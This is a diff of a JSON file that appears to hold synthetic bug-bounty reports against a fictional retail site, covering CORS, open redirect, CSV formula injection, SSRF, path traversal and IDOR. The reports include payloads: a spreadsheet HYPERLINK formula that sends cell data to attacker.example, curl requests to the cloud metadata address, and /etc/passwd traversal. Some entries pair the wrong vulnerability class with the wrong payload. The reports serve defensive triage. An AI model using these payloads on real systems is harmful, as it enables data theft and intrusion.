+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -718,7 +723,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -854,7 +860,8 @@
           "offset": "4d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://shop.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -973,7 +980,8 @@
           "offset": "2d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1088,7 +1096,8 @@
           "offset": "21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1254,7 +1263,8 @@
           "offset": "2d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1388,7 +1398,8 @@
           "offset": "4d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1524,7 +1535,8 @@
           "offset": "7d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1672,7 +1684,8 @@
           "offset": "3d 19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1843,7 +1856,8 @@
           "offset": "5d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1986,7 +2000,8 @@
           "offset": "1d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2089,7 +2104,8 @@
           "offset": "5d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2195,7 +2211,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.zedernfeld-retail.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2290,7 +2307,8 @@
           "offset": "1d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2412,7 +2430,8 @@
           "offset": "1d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2596,7 +2615,8 @@
           "offset": "6d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2728,7 +2748,8 @@
           "offset": "7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2863,7 +2884,8 @@
           "offset": "5d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3055,7 +3077,8 @@
           "offset": "6d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3162,7 +3185,8 @@
           "offset": "3d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3289,7 +3313,8 @@
           "offset": "1d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3412,7 +3437,8 @@
           "offset": "5d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.zedernfeld-retail.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3530,7 +3556,8 @@
           "offset": "1d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3678,7 +3705,8 @@
           "offset": "2d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3796,7 +3824,8 @@
           "offset": "7d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3903,7 +3932,8 @@
           "offset": "5d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4058,7 +4088,8 @@
           "offset": "22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4182,7 +4213,8 @@
           "offset": "4d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.zedernfeld-retail.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4328,7 +4360,8 @@
           "offset": "3d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4472,7 +4505,8 @@
           "offset": "6d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4572,7 +4606,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4686,7 +4721,8 @@
           "offset": "2d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
